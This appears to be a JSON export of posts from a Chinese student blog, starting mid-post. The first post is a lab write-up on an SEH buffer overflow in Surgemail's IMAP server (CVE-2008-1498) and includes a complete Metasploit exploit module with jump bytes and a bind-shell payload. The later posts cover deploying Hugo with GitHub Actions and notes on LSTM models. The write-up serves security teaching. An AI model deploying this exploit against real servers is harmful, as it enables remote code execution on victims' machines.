stack，可以看到右下角框框中就来到了覆盖的位置，可以看到覆盖的效果如我们所想，中间EH的四个字节被覆盖为了\\x42，前后分别为A和C，即\\x41和\\x43。\n此时我们可以确定我们已经掌握了正确的EH的偏移量，接下来将按照上文SEH中介绍的模式，构造攻击串。\n通过构造Payload覆盖EH内容 上文我们所做的所有内容都是在通过模糊测试发现漏洞，所以我们是在auxiliary模块中写脚本，接下来我们将直接编写Surgemail漏洞的真正的渗透攻击代码\n再次说明一次利用SEH漏洞的过程\n 通过构造输入出发一次异常处理过程 用JMP指令覆盖NextSEH即第一个SEH的第一个DWORD指针，来实现跳转到ShellCode 用指向pop-pop-ret指令序列的指针覆盖SEHandler即第一个SEH的EH部分  找一个合适的pop-pop-ret序列 参考资料中给出了两种找PPR序列的方法：使用Debugger的mona脚本；使用MSF的msfpescan工具。\nmona脚本 将corelan/mona: Corelan Repository for mona.py (github.com)或者老师给出的脚本保存到 C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands\\文件夹下\n在Immunity Debugger下方的命令行中输入\n!mona seh  等脚本运行结束，来到C:\\Program Files\\Immunity Inc\\Immunity Debugger，可以看到出现了一个seh.txt文本文件，内容如下\n通过对SafeSEH功能、ASLR功能是否开启，来筛选出来一个能用的PPR序列\n可以看到参考资料中所选的0x0078517e位置的序列，基本上啥安全功能都没开，可以作为一个可用的PPR序列\nmsfpescan工具 将Surgemail.exe从靶机中拷贝到Kali下，并在当前路径下开启MSF，使用如下命令\nmsfpescan -p ./surgemail.exe  也可以获取其中所有PPR序列的地址，但是信息要比mona脚本少很多。\n漏洞利用代码框架 框架如下，保存至~/.msf4/modules/exploits/windows/imap/目录。\nrequire 'msf/core' class Metasploit4 \u0026lt; Msf::Exploit::Remote # Point A include Msf::Exploit::Remote::Imap def initialize(info = {}) super(update_info(info, 'Name' =\u0026gt; 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow', 'Description' =\u0026gt; %q{ This module exploits a stack overflow in the Surgemail IMAP Server version 3.8k4-4 by sending an overly long LIST command. Valid IMAP account credentials are required. }, 'Author' =\u0026gt; [ 'ryujin' ], 'License' =\u0026gt; MSF_LICENSE, 'Version' =\u0026gt; '$Revision$', 'References' =\u0026gt; [ [ 'BID', '28260' ], [ 'CVE', '2008-1498' ], [ 'URL', 'http://www.exploit-db.com/exploits/5259' ] ], 'Privileged' =\u0026gt; false, 'DefaultOptions' =\u0026gt; { 'EXITFUNC' =\u0026gt; 'thread' }, 'Payload' =\u0026gt; { 'Space' =\u0026gt; 10351, 'DisableNops' =\u0026gt; true, 'BadChars' =\u0026gt; \u0026quot;\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2c\\x2f\\x3a\\x40\\x7b\u0026quot; }, 'Platform' =\u0026gt; 'win', 'Targets' =\u0026gt; [ [ 'Windows Universal', { 'Ret' =\u0026gt; \u0026quot;\\x90\\xf6\\x6e\u0026quot; } ] ], 'DisclosureDate' =\u0026gt; 'March 13 2008', 'DefaultTarget' =\u0026gt; 0)) end def exploit connected = connect_login lead = \u0026quot;\\x41\u0026quot; * 10360 # Point B evil = lead + [target.ret].pack(\u0026quot;A3\u0026quot;) # Point C print_status(\u0026quot;Sending payload\u0026quot;) sploit = '0002 LIST () \u0026quot;/' + evil + '\u0026quot; \u0026quot;PWNED\u0026quot;' + \u0026quot;\\r\\n\u0026quot; # Point D sock.put(sploit) handler disconnect end end  对脚本内容的一些解释 'References' =\u0026gt; [ [ 'BID', '28260' ], [ 'CVE', '2008-1498' ], [ 'URL', 'http://www.exploit-db.com/exploits/5259' ] ]  补充了漏洞的一些信息，BID和CVE是漏洞的编号，URL中则是漏洞的相关信息，以上补充的信息将会在MSF收到info命令的时候打印出来\n'Privileged' =\u0026gt; false  也是补充了一些信息，说明该漏洞利用成功的时候，获取到的shell的权限不是特权用户（如root、Administrator或者SYSTEM），仅仅是普通用户。漏洞利用成功后，攻击者也可以通过其他方法进行提权，这里标记的只是刚渗透攻击成功的时候用户的权限。\n'DefaultOptions' =\u0026gt; { 'EXITFUNC' =\u0026gt; 'thread' }  DefaultOptions部分是用来修改MSF中一些默认值的，这里修改了EXITFUNC，表明我们的ShellCode运行的环境是线程Thread，当ShellCode退出线程，将会回到靶机的正常工作环境（而不是还在其他环境中）。\n'Payload' =\u0026gt; { 'Space' =\u0026gt; 10351, 'DisableNops' =\u0026gt; true, 'BadChars' =\u0026gt; \u0026quot;\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2c\\x2f\\x3a\\x40\\x7b\u0026quot; }  这是对Payload的一些属性的设置，Space表明攻击负载Payload的最大长度为10351字节（因为需要留出9个字节的两次跳转的指令的长度），DisableNops表明不允许自动填充NOP指令（因为我们自己手动填充了大量的NOP指令），BadChars包含了可能会引起ShellCode不正常执行的一些字符（比如\\x00字符），这里写出的这些字符都将不会用作Payload的编码。\n'Targets' =\u0026gt; [ [ 'Windows Universal', { 'Ret' =\u0026gt; \u0026quot;\\x7e\\x51\\x78\u0026quot; } ] ]  这里是添加了PPR序列的地址，之所以要前面声明Windows Universal是因为Surgemail的这个漏洞是在任何版本的Windows上都会发生的，如果只会在特定版本出现，则需要设置特定的操作系统的版本。\n'DefaultTarget' =\u0026gt; 0  表明默认使用第0个Target，即上文定义的唯一一个Target。\nlead = \u0026quot;\\x41\u0026quot; * 10360 # Point B evil = lead + [target.ret].pack(\u0026quot;A3\u0026quot;) # Point C  目前还没有开始构造，除了最后的PPR序列的地址，其他填充的目前都还是“A”\n构造攻击串 根据上文的介绍，我们的攻击串的结构如下\n[一段任意的缓冲区填充 | NOP空指令滑行区 | ShellCode | Near JMP | Short JMP | PPR]\n其中前两段合并为全部填充NOP指令，即lead部分\nShellCode部分将由MSF框架中的其他脚本组成，将在执行脚本的时候设置，即payload部分\nNear JMP部分将填充一个向低地址跳转的5字节近跳转指令，即near部分\n\u0026ldquo;\\xe9\\xdd\\xd7\\xff\\xff\u0026quot;是jmp dword 0xffffd7e2的字节码，其中0xffffd7e2是-10270的补码，向低地址跳转了10270字节\nShort JMP部分将填充一个向低地址跳转的4字节跳转指令，因为这部分覆盖的是SEH的NextSEH指针，所以叫nseh部分\nPPR部分将由[target.ret].pack(\u0026quot;A3\u0026quot;)填充PPR序列的地址\nlead = \u0026quot;\\x90\u0026quot; * (10351 – payload.encoded.length) near = \u0026quot;\\xe9\\xdd\\xd7\\xff\\xff\u0026quot; nseh = \u0026quot;\\xeb\\xf9\\x90\\x90\u0026quot; evil = lead + payload.encoded + near + nseh + [target.ret].pack(\u0026quot;A3\u0026quot;)  检查是否能正确覆盖 修改完上述的攻击脚本后，就可以进行攻击了，首先使用的攻击载荷Payload为generic/debug_trap，这并不是一个真正的攻击载荷，而是发送了大量的\\xCC（中断指令），方便对渗透攻击指令的执行流程进行动态调试，这方便我们检查攻击过程中ShellCode是否已经被插入到了正确位置并正确被执行。\nuse exploit/windows/imap/surgemail_overflow set imapuser \u0026lt;username\u0026gt; set imappass \u0026lt;userpass\u0026gt; set rhosts \u0026lt;target ip\u0026gt; set payload generic/debug_trap  可以看到用generic/debug_trap作为攻击载荷的时候，并不会获得Shell，出现上图信息基本上就是攻击成功了，具体信息需要来到靶机来查看\n可以看到内容已经被覆盖成了我们想要的样子\n真正的攻击 就把payload换一下就行，记得重启Surgemail，这样可能会出现不成功的情况，多试几次\n这次不用开启Debugger了，要不然异常处理会被拦下来\nset payload windows/shell_bind_tcp  亲测上面这个payload比《第14章》的那个好用\n添加脚本的漏洞检测模块Check 最后完整能用的漏洞利用脚本如下surgemail_overflow.rb：\nrequire 'msf/core' class Metasploit4 \u0026lt; Msf::Exploit::Remote include Msf::Exploit::Remote::Imap def initialize(info = {}) super(update_info(info, 'Name' =\u0026gt; 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow', 'Description' =\u0026gt; %q{ This module exploits a stack overflow in the Surgemail IMAP Server version 3.8k4-4 by sending an overly long LIST command. Valid IMAP account credentials are required. }, 'Author' =\u0026gt; [ 'ryujin' ], 'License' =\u0026gt; MSF_LICENSE, 'Version' =\u0026gt; '$Revision$', 'References' =\u0026gt; [ [ 'BID', '28260' ], [ 'CVE', '2008-1498' ], [ 'URL', 'http://www.exploit-db.com/exploits/5259' ] ], 'Privileged' =\u0026gt; false, 'DefaultOptions' =\u0026gt; { 'EXITFUNC' =\u0026gt; 'thread' }, 'Payload' =\u0026gt; { 'Space' =\u0026gt; 10351, 'DisableNops' =\u0026gt; true, 'BadChars' =\u0026gt; \u0026quot;\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2c\\x2f\\x3a\\x40\\x7b\u0026quot; }, 'Platform' =\u0026gt; 'win', 'Targets' =\u0026gt; [ [ 'Windows Universal', { 'Ret' =\u0026gt; \u0026quot;\\x90\\xf6\\x6e\u0026quot; } ] ], 'DisclosureDate' =\u0026gt; 'March 13 2008', 'DefaultTarget' =\u0026gt; 0)) end def check connect disconnect if (banner and banner =~ /(Version 3.8k4-4)/) return Exploit::CheckCode::Vulnerable end return Exploit::CheckCode::Safe end def exploit connected = connect_login # Final Evil String lead = \u0026quot;\\x90\u0026quot; * (10351 – payload.encoded.length) near = \u0026quot;\\xe9\\xdd\\xd7\\xff\\xff\u0026quot; nseh = \u0026quot;\\xeb\\xf9\\x90\\x90\u0026quot; evil = lead + payload.encoded + near + nseh + [target.ret].pack(\u0026quot;A3\u0026quot;) print_status(\u0026quot;Sending payload\u0026quot;) sploit = '0002 LIST () \u0026quot;/' + evil + '\u0026quot; \u0026quot;PWNED\u0026quot;' + \u0026quot;\\r\\n\u0026quot; sock.put(sploit) handler disconnect end end  是用于检测靶机上有无目标漏洞的，使用方法如下图\n","id":2,"section":"posts","summary":"\u003cp\u003e2021年第四次网安实践内容笔记\u003c/p\u003e","tags":["Metasploit3","渗透测试"],"title":"网安实践 渗透测试2","uri":"https://qeryu.github.io/2021/05/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952/","year":"2021"},{"content":"考试周前找点乐子，感觉Hugo提供的实时反馈真的爽\n于是趁着博客文件从老电脑转到新电脑的机会，也来试试Hugo\n安装 Windows端安装，可以直接从Hugo官方仓库的Release界面下载对应操作系统的压缩包Releases · gohugoio/hugo (github.com)\n然后找个位置解压缩就行，解压缩位置和Blog的位置没啥关系\n为了方便使用hugo.exe，需要把所在路径添加到环境变量PATH\n此外，电脑上还需要安装git，以下命令建议都在git bash中运行\n基本使用 发布一篇博客 找个风水宝文件夹作为自己的博客根目录，新建一个博客网站叫做MyBlogSiteName（名字可修改）\nhugo new site MyBlogSiteName  然后在当前目录下就能看到出现了一堆文件夹，其中有博客的配置文件config.toml\n其他文件夹的功能如下：\n. ├── archetypes # 储存.md的模板文件，类似于hexo的scaffolds，该文件夹的优先级高于主题下的/archetypes文件夹 ├── config.toml # 配置文件 ├── content # 储存网站的所有内容，类似于hexo的source ├── data # 储存网站的所有内容，类似于hexo的source ├── layouts # 储存.html模板，该文件夹的优先级高于主题下的/layouts文件夹 ├── static # 储存图片,css,js等静态文件，该目录下的文件会直接拷贝到/public，该文件夹的优先级高于主题下的/static文件夹 └── themes # 储存主题，下文中将会把主题保存到这里  Hugo的博客配置文件支持toml, yml, json格式，其中每项意义可见 Configure Hugo | Hugo (gohugo.io)\n新建一个文章\nhugo new posts/my-new-post.md  新建一个页面（比如About页面）\nhugo new about.md  启动一个Web服务器，快速实现对静态网页的生成，然后可以在本地预览自己的博客，访问 http://localhost:1313\nhugo server -D # -D 显示草稿draft文件  生成渲染后的静态网页\nhugo  其他命令：\n# 使用方法: hugo hugo [flags] hugo [command] hugo [command] [flags] # 节选的 command: new # 为你的站点创建新的内容 server # 一个高性能的web服务器 # 节选的 flags: -D, --buildDrafts # 包括被标记为draft的文章 -E, --buildExpired # 包括已过期的文章 -F, --buildFuture # 包括将在未来发布的文章 # 举几个栗子: hugo -D # 生成静态文件并包括draft为true的文章 hugo new post/new-content.md # 新建一篇文章 hugo new site mysite # 新建一个称为mysite的站点 hugo server --buildExpired # 启动服务器并包括已过期的文章  主题 Hugo提供了一大堆挺好看的主题 Complete List | Hugo Themes (gohugo.io)\n我目前在用的是 Hugo Theme Pure | Hugo Themes (gohugo.io)，感觉还挺简洁的\n导入主题的方法需要注意，不能直接clone到themes文件夹，而是需要在根目录下\ngit submodule add https://github.com/xiaoheiAh/hugo-theme-pure.git themes/pure  这样会将主题文件作为当前仓库的子模块导入，Git子模块允许我们将一个或者多个Git仓库作为另一个Git仓库的子目录，它能让你将另一个仓库克隆到自己的项目中,同时还保持提交的独立。Git - 子模块 (git-scm.com)\n具体子模块的路径与原URL的信息将保存在根目录的.gitmodules文件中\n否则将会在下一步GitHub Action执行时出现如下报错\nNo submodule mapping found in .gitmodules for path 'path/to/submodule'  部署到GitHub 首先需要去GitHub上开两个仓库，一个用来保存所有的博客文件，一个是熟悉的\u0026lt;username\u0026gt;.github.io\n第一个仓库可以设置为私有，在创建完成后把博客内容全部add commit push一把梭搞上去就行。\n第二个仓库参见https://pages.github.com/。\n生成personal_token 在GitHub上的Settings - Developer Settings - Personal access tokens中，生成一个personal_token\n需要在生成的时候勾选repo、admin:repo_hook这两个中的所有内容\n注意提示信息，这个token只会出现一次，如果没有及时保存使用就再也找不到了\n上传配置文件 执行以下几步：\n 在源码repo里新建一个github-actions分支：git checkout -b github-actions 在repo根目录新建嵌套的两个文件夹.github/workflows 在workflows里新建一个后缀为.yml的配置文件，名字自取。 写进去以下配置（从hugo官方文档修改而来）：  name: github pages # 名字自取 on: push: branches: - github-actions # 这里的意思是当 main分支发生push的时候，运行下面的jobs，这里先改为github-actions jobs: deploy: # 任务名自取 runs-on: ubuntu-18.04\t# 在什么环境运行任务 steps: - uses: actions/checkout@v2\t# 引用actions/checkout这个action，与所在的github仓库同名 with: submodules: true # Fetch Hugo themes (true OR recursive) 获取submodule主题 fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo\t# 步骤名 uses: peaceiris/actions-hugo@v2\t# hugo官方提供的action，用于在任务环境中获取hugo with: hugo-version: 'latest'\t# 获取最新版本的hugo # extended: true - name: Build run: hugo --minify\t# 使用hugo构建静态网页 - name: Deploy uses: peaceiris/actions-gh-pages@v3\t# 一个自动发布github pages的action with: # github_token: ${{ secrets.GITHUB_TOKEN }} 该项适用于发布到源码相同repo的情况，不能用于发布到其他repo external_repository: \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io\t# 发布到哪个repo personal_token: ${{ secrets.ACTION_ACCESS_TOKEN }}\t# 发布到其他repo需要提供上面生成的personal access token publish_dir: ./public\t# 注意这里指的是要发布哪个文件夹的内容，而不是指发布到目的仓库的什么位置，因为hugo默认生成静态网页到public文件夹，所以这里发布public文件夹里的内容 publish_branch: main\t# 发布到哪个branch  然后将以上内容push到GitHub，然后来到这个仓库的网站的Action，就能看到现在已经在执行了\n但是铁定会执行失败，因为没有操作其他仓库的权限，在该仓库的Settings - Secret中添加\n然后把刚才申请到的personal_token填入其中，名字叫做ACTION_ACCESS_TOKEN，即和上文yml配置文件保持一致。\n回到Action中，然后Re-run刚才失败的那一次，即可看到成功。\n收个尾 将刚才用于尝试的github-action分支合并会原来的main分支\n然后正常在根目录下add-commit-push一把梭，GitHub Pages那边就能同步获取到渲染后的静态网页，完成博客的更新。\n参考 Hugo 从入门到会用 - olOwOlo\nHUGO (gohugo.io)社区\nHugo Documentation | Hugo (gohugo.io)\nHugo使用Github Action自动部署博客到Github Pages - Tomial\u0026rsquo;s Blog\n","id":3,"section":"posts","summary":"\u003cp\u003e考试周前找点乐子，感觉Hugo提供的实时反馈真的爽\u003c/p\u003e\n\u003cp\u003e于是趁着博客文件从老电脑转到新电脑的机会，也来试试Hugo\u003c/p\u003e","tags":["Blog"],"title":"Hexo迁Hugo搬家记","uri":"https://qeryu.github.io/2021/05/hexo%E8%BF%81hugo%E6%90%AC%E5%AE%B6%E8%AE%B0/","year":"2021"},{"content":"学长安排的更新一下Montage模型的学习进度\n大致流程 准备运行环境 Montage运行需要Linux环境以及CUDA（也就是说需要一张显卡\u0026hellip;）\n而本菜菜之前从来没有用过有独显的电脑，所以学习CUDA以及显卡驱动之间的关系耽误了一些时间，主要遇到的问题的解决思路是：\n更新显卡驱动 先查看已有的显卡驱动的版本（上方会有显示，比如服务器原本的版本是330.***），如果足够高那就不用更新了\nnvidia-msi  如果版本较低，需要先卸载掉已有的版本\nsudo apt purge nvidia*  然后可以在 NVIDIA官网 上查询与显卡型号对应的最新的显卡驱动，然后手动下载安装（wget下来然后sh运行run文件），网上也有通过apt安装的方法，但是我捣鼓了一个小时发现总会有获取不到信息的问题，这个没能解决，参考内容 CSDN 更新显卡驱动\n   本次更新的显卡驱动版本信息      Version: 440.118.02   Release Date: 2020.9.30   Operating System: Linux 64-bit   CUDA Toolkit: 10.2   Language: English (US)   File Size: 137.71 MB       服务器显卡信息      Product Type Tesla   Product Series V-Series   Product Tesla V100   Operating System Linux 64-bit   CUDA Toolkit 10.2    下载安装CUDA 接下来内容就比较简单了，从NVIDIA官网下载CUDA-10.2（选择这个版本是因为这个版本能配上最新的pytorch），如何安装都在网页中写了，这里就不复制粘贴了。\nhttps://developer.nvidia.com/cuda-10.2-download-archive?target_os=Linux\u0026amp;target_arch=x86_64\u0026amp;target_distro=Ubuntu\u0026amp;target_version=1804\u0026amp;target_type=runfilelocal\n安装完成后需要重启\nsudo reboot  下载安装PyTorch PyTorch官网安装指导 https://pytorch.org/get-started/locally/\nLinux系统上，配套CUDA-10.2的安装比较方便\npip install torch torchvision  检测安装是否成功 安装完成后，可以进行以下操作进行检验\ncd /usr/local/cuda-10.2/samples/1_Utilities/deviceQuery sudo make ./deviceQuery cd ../bandwidthTest/ sudo make ./bandwidthTest  如果这两个运行结果都是PASS的话，那就安装成功了，如果不成功，emmm，我也不知道，建议直接Stack Overflow\n载入配置 配置信息保存在了conf/conf.json文件中，与语言模型相关的属性都在model内容中\n bug_dir: 保存发现的bug的文件夹，需要填写绝对路径 data_dir: 保存预处理后的数据，需要填写绝对路径 eng_name: 待测试的 JS 引擎的名字 (\u0026ldquo;chakra\u0026rdquo;, \u0026ldquo;v8\u0026rdquo;, \u0026ldquo;moz\u0026rdquo;, \u0026ldquo;jsc\u0026rdquo;). eng_path: 保存 JS 引擎的文件夹，需要填绝对路径 max_ins: 生成过程中，新增的 fragment 的数量上限 model_path: 保存学习到的语言模型的文件夹，需要填写绝对路径 batch_size: 训练模型的时候的 batch 大小 emb_size: 将 fragment 嵌入成向量时，嵌入向量的维度 epoch: 训练的最大轮数 gamma: 学习过程中，学习速率需要不断减小，该量为每次减小的倍数 lr: 初始学习速率，即SGD算法中的初始梯度下降速度 momentum: 这里使用的优化器方法为使用Momentum的SGD（一种梯度下降算法），该参数给出了该算法的一个惯性参数，具体解释参见参考资料 split_size: The size of each split. Montage splits each sequence into multiple sequences for training efficiency. weight_decay: 用于减少模型过拟合问题，对神经网络中的新增的权重会有权重衰减，该项也称为L2正则化权重衰减（详细内容可参见参考资料），该参数给出的是L2正则化中的正则化系数 num_gpu: 用于该项目的GPU的个数 num_proc: 用于该项目的CPU的个数 opt: 运行 JS 引擎的其他指令内容 seed_dir: 用于保存 JS 种子文件的文件夹，需要填写绝对路径 timeout: 编译器编译运行 JS 代码的时间上限，如果超过则视为编译失败 top_k: 对应论文中的k_suggestions，即每次编译时提供的最可能的代码片段的数量  载入数据与预处理 从第一部分处理好的数据中载入数据，并进行数据的预处理。其实预处理也没啥内容了，毕竟真正的预处理内容已经在第一部分做过了。\n主要执行这些功能的函数是/src/train.py中的：\n load_data(self)  将第一阶段生成的已经序列化的数据反序列化得到信息 并将数据集的属性信息记录在ModelTrainer类的内部变量中 最后将纯粹的数据集信息按照1:9的比例划分测试集与数据集   process_data(self, train, test)  先分别将训练集与测试集转换为data（见函数arr2data）  这部分有一个没有搞明白的，如下图   再将data信息按照conf.json文件中的配置信息_batch_size截取成合适的batch 将总inputs以及总outputs中，按照batch_size进行分割得到batches 即一个batch中batch_size个fragment的序列    模型 /src/train.py中的主要内容\ndef init_model(self): self.print_config() type_mask = self.build_type_mask() # 交叉熵评定函数，对每个数据都计算交叉熵 loss = CrossEntropyLoss(reduction='none') # 语言模型的字典大小 vocab_size = len(self._oov_frag_list) # 每个GPU所需要计算的batch数量 batch_per_gpu = int(self._emb_size / self._num_gpu) # 初始化训练模型 model = LSTM(vocab_size, self._emb_size, type_mask, loss, batch_per_gpu) # 实现从CPU到GPU的内存信息转移 model.cuda() # 使用SGD(一种梯度下降算法变种)对模型进行优化 # 给出初始梯度下降步长lr，以及初始惯性系数mometum，以及权重衰减系数 optimizer = SGD(model.parameters(), lr=self._lr, momentum=self._momentum, weight_decay=self._weight_decay) # 按照指数衰减调整学习率，调整公式为lr = lr * gamma ** epoch scheduler = ExponentialLR(optimizer, gamma=self._gamma) return model, optimizer, scheduler  该函数主要功能有：\n 定义交叉熵损失函数 确定语言模型的字典大小 初始化训练模型（根据配置信息与数据信息） 设定模型的优化器以及学习速率调整器  分层内容 关于模型的主要代码\ndef __init__(self, vocab_size, embedding_dim, type_mask, loss_function, batch_per_gpu): super(LSTM, self).__init__() # 输入层 self.embeddings = nn.Embedding(vocab_size, embedding_dim) # 隐藏层 self.lstm = nn.LSTM(input_size=embedding_dim, hidden_size=embedding_dim) # 输出层 self.out_dim = embedding_dim * 2 + 1 # 最后一层是线性回归函数 self.fc = nn.Linear(self.out_dim, vocab_size) # 语言模型词典规模 self.vocab_size = vocab_size self.type_mask = type_mask # softmax仅对结果tensor的第1维使用（维度从0开始计算） # 其他信息均为从train.py转移到model.py的参数信息 self.softmax = nn.Softmax(dim=1) self.loss_function = loss_function self.embedding_dim = embedding_dim self.batch_per_gpu = batch_per_gpu  依旧是导入数据以及配置信息\n训练模型 以下为本次一轮epoch中的训练函数，其中包括了对数据的pad、投入模型进行训练以及统计准确度与损失\ndef run_epoch(self, model, batches, epoch, optimizer=None, scheduler=None, mode=None): # 将上一轮的训练信息清零 total_cross_entropy = 0.0 total_diff = 0.0 total_acc = 0.0 num_val = 0 is_train = (optimizer != None) if is_train: # 进度条 batch_iter = tqdm(batches) model.train() else: batch_iter = batches model.eval() # 对一组batches中的每一个batch进行pad然后投入训练 for batch in batch_iter: # 对batch中的所有信息进行pad padded_batch = pad_input(batch) # 将pad后的input/pfrag/type/output信息，切分成chunk (input_frag_chunks, pfrag_chunks, type_chunks, output_chunks) = map(self.split_batch, padded_batch[:4]) # 等到后面用完再切分 seq_len_chunks = padded_batch[4] # num_val统计目前已经训练过多少个fragment num_val += sum(seq_len_chunks) hidden = None seq_len_chunks = self.split_length(seq_len_chunks) data_chunks = zip(input_frag_chunks, pfrag_chunks, output_chunks, seq_len_chunks, type_chunks) for data_chunk in data_chunks: # Zero out grads # 清除上一轮训练的梯度信息 model.zero_grad() # 将需要训练的数据转换为张量tensor (input_frag_chunk, pfrag_chunk, output_chunk, seq_len_chunk) = map(data2tensor, data_chunk[:4]) type_chunk = data2tensor(data_chunk[4], tensor_type='Float') # Forward pass # 开始LSTM模型的向前传播，这里调用的是model中LSTM类下的forward函数 res = model(input_frag_chunk, pfrag_chunk, type_chunk, hidden, output_chunk, seq_len_chunk) # 计算本次训练的损失值 hidden, pred, cross_entropy_loss, top_k_loss = res hidden = repackage_hidden(hidden) if is_train: # 反向传播修正 loss = top_k_loss + cross_entropy_loss self.backward_pass(loss, optimizer) # 总偏差、交叉熵以及准确度 total_diff += float(torch.sum(top_k_loss)) total_cross_entropy += float(torch.sum(cross_entropy_loss)) total_acc += float(torch.sum(pred)) if is_train: # 修改学习步长 scheduler.step() total_loss = (total_diff + total_cross_entropy) / num_val pplx = np.exp(total_cross_entropy / num_val) acc = total_acc / num_val total_diff = total_diff / num_val # 输出本轮训练的结果信息 self.print_metrics(mode, epoch, total_loss, pplx, total_diff, acc) return pplx  参考资料 机器学习算法 CSDN 机器学习优化器算法Optimizer详解\n知乎 mask矩阵在深度学习中有哪些应用场景？\n简书 SGD+Mometum中的weight decay\nCSDN 权重衰减（weight decay）与学习率衰减（learning rate decay）\n机器学习工具 Python Python zip() 函数\nPython pickle 对象序列化\nPyTorch pytorch小知识点（二）\u0026mdash;\u0026mdash;-CrossEntropyLoss（reduction参数）\nPyTorch官方文档 关于softmax接口的dim参数内容\n知乎 torch.cat与torch.chunk的使用\nLSTM细节分析理解（pytorch版）\nStackOverflow 为什么PyTorch中要主动清除上一轮训练的梯度信息\nPytorch中的RNN之pack_padded_sequence()和pad_packed_sequence()\n","id":4,"section":"posts","summary":"\u003cp\u003e学长安排的更新一下Montage模型的学习进度\u003c/p\u003e","tags":["LSTM","Montage"],"title":"相似论文LSTM模型部分学习","uri":"https://qeryu.github.io/2020/09/%E7%9B%B8%E4%BC%BC%E8%AE%BA%E6%96%87lstm%E6%A8%A1%E5%9E%8B%E9%83%A8%E5%88%86%E5%AD%A6%E4%B9%A0/","year":"2020"},{"content":"LSTM入门学习笔记\n功能 长短期记忆（LSTM）是一种特殊的RNN，相比于普通的RNN主要解决了长序列输入的任务中，在训练过程中出现的梯度消失和梯度爆炸问题。简单来说，就是相比普通的RNN，LSTM能够在更长的序列中有更好的表现。\nLSTM主要应用在以下领域：\n 语音识别，即从长序列的语音信号中获取信息 机器翻译，这个不用解释了吧 情感分析，即给出一个句子，判断句子中包含的情感倾向  原理 传统的RNN仅有一个传递状态h，而LSTM则在原有的RNN基础上增加了一个传递状态c。\n这两个传递状态的区别在于，传递状态h在每次传递过程中变化比较大（大到相邻两个h几乎不一样），而传递状态c在每次传递过程中变化比较小。结合“长短期记忆”这个名字来理解，h代表了新输入的x给整体产生的会在后期逐渐消失的短时新鲜记忆，而c代表了对前期记忆的不断加工，锤炼和理解，沉淀下来的长期记忆。\n详细的数学过程因为我个菜菜能力有限，看不明白，就先贴到这里吧，这是论文中引用的[23]内容，好像是最初提出LSTM模型的论文。\nhttps://www.bioinf.jku.at/publications/older/2604.pdf\n拼接获取四个状态 $z^f$， $z^i$，$z^o$是由拼接向量乘以权重矩阵之后，再通过一个$sigmod$激活函数转换成0到1之间的数值，来作为一种门控状态。而$z$则是将结果通过一个$tanh$激活函数将转换成-1到1之间的值，这里使用$tanh$是因为这里是将其做为输入数据，而不是门控信号。\n $\\odot$是Hadamard Product，即矩阵中对应的元素相乘，要求两个相乘矩阵同型。 $\\oplus$代表进行矩阵加法。  忘记 这一阶段主要使用的是上文计算出的$z^f$，上标 f 表示forget，使之与$c^{t-1}$相乘（不是矩阵乘法），以达到选择性忘记其中部分内容的效果。\n这一步中没有对$h^{t-1}$进行操作，即只根据短期记忆的结果，影响了长期记忆，实现了长期记忆随着时间而逐步淡化的过程。\n选择记忆 这一阶段主要使用的是上文计算出的$z^i$，上标 i 表示input，使之与$x^t$计算得到的$z$相乘（不是矩阵乘法），以达到选择其中重要部分记忆的效果。\n将以上两部分相加，意义上是将长期记忆的遗忘与当前记忆的更新结合起来，形成新的长期记忆，即通过上图中的第一个式子，得到了新的长期记忆$c^t$。\n输出 从上文可见，LSTM的输出总共有三个部分，$c^t$、$h^t$和$y^t$，前者已经通过前两部分生成了。\n这一阶段主要使用了上文计算得出的$z^o$，上标 o 表示output，使之与经过$tanh$处理的$c^t$相乘（不是矩阵乘法），以达到综合当前输入以及长期记忆生成短期记忆h的效果。而与一般的RNN类似，当前输出$y^t$是$h^t$通过上图中第三个式子计算得到的。\n具体实现 TensorFlow Colab 使用LSTM对TensorFlow官网上给出的IMDB影评信息进行分类\nTensorFlow官方教程 使用LSTM进行时间序列预测\nTensorFlow对LSTM的API文档\n在搜索资料过程中发现的新想法  使用GRU能够达到与LSTM相当的效果，并且相比之下更容易进行训练，能够很大程度上提高训练效率  论文中的LSTM 上文说到，代码碎片是代码生成的AST中的一个子树，其根节点是总AST的一个非叶子节点，其深度始终为2。\n前文已经通过一些方法将代码转换成AST并从中提取了所有可能的代码碎片，并通过AST的前序遍历将代码碎片组合成了一个个序列。\n在训练LSTM模型的过程中，为了避免总词汇表中包含过多不常见代码碎片，这里选用了常用的处理方法，即将出现频率少于5次的代码碎片标记为OoV即不在词汇表中，不参与后续训练与生成。\n训练目标 总体上说，训练目标是得到一个模型，依次输入一个代码碎片的序列，模型会输出下一个代码碎片的概率分布情况。\n这里的总目标是是适应于后期代码生成的，后期代码生成即参考概率最大的前k个可能的代码碎片生成新的AST\n该模型的两个训练目标如下：\n 预测下一个有着最大输出概率的正确的代码碎片 优先提供与实际情况下有着相同type的代码碎片  其中，代码碎片的type指的是，代码碎片对应的子树的根节点的类型。\nLSTM模型 这里的语言模型总共是用了三层\n 一层映射层，即将代码碎片通过嵌入（embedding）的方式映射成了32维的向量 一层LSTM层，基本内容同上文介绍的LSTM内容 一层输出层  这里有一些和上文介绍的LSTM内容不一致的地方，LSTM层会输出当前记忆$h^t$，该内容会和下一个代码碎片的type的嵌入向量、下一个代码碎片的父代码碎片的嵌入向量进行连接，然后再投入到输出层去生成对下一个代码碎片的预测信息。\n损失函数 这里的损失函数也没有使用TensorFlow或者pytorch常用的损失函数，而是重新定义了一个适应于模型训练目标的损失函数。\n这里主要采用的是经验风险最小化的原则，对模型的复杂度没有设置正则化项。\n具体的损失函数$l_1$、$l_2$内容如下：\n即，前者采用的是交叉熵损失函数，用于在多分类问题中度量两个概率分布（预测概率分布与实际概率分布）之间的相似性，最小化该项可以达到模型训练的第一个目的。后者采用的是一个名为type error的损失函数，用于衡量预测结果的type与实际结果type的相似度（总概率之差），最小化该项可以达到模型训练的第二个目的。\n与其他fuzz工具的不同点 